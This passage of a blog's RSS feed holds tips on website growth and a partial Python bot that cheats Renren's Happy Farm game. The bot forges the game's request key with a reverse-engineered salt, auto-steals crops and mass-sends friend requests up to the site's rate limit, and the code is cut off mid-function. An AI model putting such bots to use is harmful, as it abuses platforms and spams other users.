Rose和大家分享了一个网站怎么从0个用户迅速发展到100万用户的9个方法。我大致把一些要点翻译出来，和大家分享下。大道至简，做起来难。<p>　<strong>　#1. 自我Ego</strong></p><p>　　1. 问自己：我的这些功能特征提高了用户的自我价值感或者是自尊了吗?</p><p>　　2. 如果一个用户对网站做了贡献(发表帖子，简单的顶一下或者打分等)，他们有没有那种被奖赏的心情呢?用户能得到什么可见的奖赏吗?</p><p>　　3. twitter的followers的数量，给用户的奖赏是数字越大心理满足越大;还有digg的digg数量等，都给用户一个很直观的奖赏信息;</p><p><strong>　　#2. 简洁Simplicity</strong></p><p>　　1. 停止去创建更多的功能;</p><p>　　2. 专注在一两个特色功能;</p><p>　　3 问问自己：还有哪些功能特征还能够去掉?</p><p><strong>　　#3. 开发和发布Build &amp; Release</strong></p><p>　　1. 不要去想你了解你的用户;</p><p>　　2. 从用户在你网站上实际做的事情中去了解，而不是你认为哪些事情用户会做;</p><p>　　3. 决定一些你要做的事情，然后去做。</p><p>　　4. 开发，发布，迭代和反复</p><p><strong>　　#4. 向媒体发出声音Hack The Press</strong></p><p>　　1. 只通过系统邀请(pownce digg v3)</p><p>　　2.和一些资历较浅的blogger交流</p><p>　　3.参加一些交流活动，利用社交关系宣传，出席活动的时候带上网站的demo;</p><p><strong>　　#5.和自己的社区交流 Connect with your community</strong></p><p>　　1. 启动一个播客;</p><p>　　2.举行一个发布会，然后年度/季度活动-邀请新闻/有影响力的个人-不要告诉栏</p><p>　　3. 参与社区，活跃在自己的生态体系中;</p><p><strong>　　#6. 咨询顾问Advisors</strong></p><p>　　1. 遇到什么技术难题?</p><p>　　2.顾问可以在各领域发挥作用(市场营销/招聘/业务开发)</p><p>　　3. 股票报酬，通常不是一个董事会席位，坚实的顾问有助于筹款;</p><p>　　<strong>#7. 利用你的用户群，口碑相传Leverage your userbase to spread the word</strong></p><p>　　<strong>#8. 你的产品对于第三方网站是否有价值?Does your product provide value for 3rd party sites?</strong></p><p>　　<strong>#9. 分析你的流量Analyze your traffic</strong></p><p>　　1. 安装google ****ytics</p><p>　　2.分析流量来源(搜索?)</p><p>　　3.用户在网站上的访问轨迹</p><p>　　4.分析那些退出率高的页面</p>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720099179841627/</guid>
    </item>
    <item>
      <title>
<![CDATA[网络程序外挂的无奈]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200972192750690/</link>
      <description>
<![CDATA[对于服务器的每次升级，都需要耗费时间调试修改代码，维护的代价太昂贵了<br>是否有可能结合Firebug与GreaseMonkey，做出一个网页操作宏的程序，根据用户的操作生成相应的代码，然后只要调整某些的代码，即可生成外挂程序。类似界面开发IDE，如Eclipse的VE<br><br>2009年8月21日校内网的开心农场升级后的代码<br>#!/usr/bin/env python<br>#encoding: utf-8<br>#2009-8-21 升级后<br>imp<wbr>ort urllib,urllib2,cookielib<br>imp<wbr>ort time,zlib,re,md5<br>imp<wbr>ort cStringIO,gzip<br>imp<wbr>ort json<br>imp<wbr>ort pickle<br>imp<wbr>ort thread,sys,os<br>class Farm:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;debug=False<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;status={} #self's farm status<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;friends={} #list of friends<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;shop={} #information of seeds<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;bag={} #背包<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;uid=0 #user id<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;autoweed=True #自动除草<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;autonorm=True #自动杀虫<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;autowater=True #自动浇水<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;autofert=True #自动施肥<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;autoplant=True #自动种植<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;autosteal=True #自动收获<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#创建Cookie<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def __init__(self):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;cj=cookielib.LWPCookieJar()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;opener.addheaders=[('User-agent','Opera/9.23')]<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;urllib2.install_opener(opener)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 请求网页的工具函数，直接返回网页内容<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def req(self,url,body=()):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if len(body)==0:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;req=urllib2.Request(url)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;req=urllib2.Request(url,urllib.urlencode(body))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;while True:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;try:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;raw=urllib2.urlopen(req)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;except:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print 'ReqError url:%s' % url<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pass<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if self.debug: #输出调试信息<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print url<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print body<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return raw.read()<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def param(self): # build params farmKey and farmTime<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farmTime=str(time.time())[0:10]<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farmKey=md5.md5(farmTime+'15l3h4kh').hexdigest()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return (farmKey, farmTime)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 登录校内网 获取校内网到开心网的链接地址,并取得Cookie<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def login(self, email, password):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url="http://login.renren.com/Login.do"<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body=(("email",email),("password",password))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;ret=self.req(url,body)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;uids=re.findall('http\:\/\/renren\.com\/profile\.do\?id\=(\d+)',ret)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if len(uids)&gt;0:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.uid=uids[0]<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print ret<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# build cookie to faminutes<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://apps.renren.com/happyfarm?origin=104'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=re.findall('iframe_canvas" src="([^"]+)"',self.req(url))[0]<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=url.replace('?','/?').replace('&amp;amp;','&amp;') # fuck url, it lacks a '/'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;raw=self.req(url)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# read current status<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://xn.hf.fminutes.com/api.php?mod=user&amp;act=run&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=' % self.param()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.status=json.read(self.req(url))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 添加某个好友<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def addFriend(self,fid):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://friend.renren.com/ajax_request_friend.do'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={'from':'undefined','id':fid,'why':''}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body)) #添加<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 删除无农场的好友<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def clearFriends(self):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.listFriends()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;reserved = []<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for x in self.friends:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;reserved.append(int(x['userId']))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print 'reserved:%d' % len(reserved)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url = 'http://friend.renren.com/myfriendlistx.do'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;renrens = json.read(re.findall(' friends=(.*);',self.req(url))[0])<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for x in renrens:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if not x['id'] in reserved:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url = 'http://icode.renren.com/getcode.do?t=delfriend_&amp;temp=%d' % int(time.time()*1000)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;raw=self.req(url)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;open('test.bmp','w').write(raw) #用于人工观察识别<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;open('test2.bmp','w').write(raw) #用于保留记录，分析识别方法<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;verify = str.rstrip(sys.stdin.readline())<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url = 'http://friend.renren.com/DelFriend.do'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body = {'id':x['id'],'co<wbr>de':verify}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;raw=json.read(self.req(url,body))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print x['id'],raw<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if raw['ret']==0:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;os.rename('test2.bmp',verify+".bmp")<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 添加新好友<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def addFriends(self):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if os.path.exists('main.pic'):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;added=pickle.load(open('main.pic'))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;added=[]<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://friend.renren.com/myfriendlistx.do'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;friends=json.read(re.findall(' friends=(.+)\;',self.req(url))[0])<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;scanedN=0<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;addedN=0<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for friend in friends:#自己的每个好友<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;curpage=0<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;while True:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://friend.renren.com/GetFriendList.do?curpage=%s&amp;id=%s' % (curpage,friend['id'])<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;raw=self.req(url)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;ffs=re.findall('\(\'addFriend(\d+)',raw)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for ff in ffs:#好友的每个好友<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;scanedN+=1<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if ff in added:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print '%s Added' % ff<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;continue<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;addedN+=1<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;ret=self.addFriend(ff)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;added.append(ff)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print ff,ret['message'].encode('utf-8')<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if ret['message'].startswith(u'短时间内不要加太多好友'):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pickle.dump(added,open('main.pic','w'))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;time.sleep(5)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if len(re.findall('下一页',raw))==0:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print 'On<wbr>e Friend OK, scaned:%d\t Added:%d' % (scanedN,addedN)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pickle.dump(added,open('main.pic','w'))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 